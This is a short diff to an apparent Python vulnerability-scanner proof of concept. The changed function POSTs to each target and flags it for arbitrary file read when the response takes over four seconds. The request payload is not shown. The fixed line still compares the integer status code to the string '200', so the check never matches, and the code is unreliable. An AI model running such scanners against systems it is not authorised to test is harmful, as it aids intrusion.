@@ -53,7 +53,7 @@ def poc(target):
         response1 = requests.post(url, data=data, headers=headers, verify=False, timeout=15)
         # print(response1.text)
         response1_time = response1.elapsed.total_seconds()
-        if response1.status_code = "200" and response1_time > 4:
+        if response1.status_code == "200" and response1_time > 4:
             print(f"[++++++] {target} 存在 任意文件读取")
             with open("result.txt", "a+", encoding="utf-8") as f:
                 f.write(target + "\n")
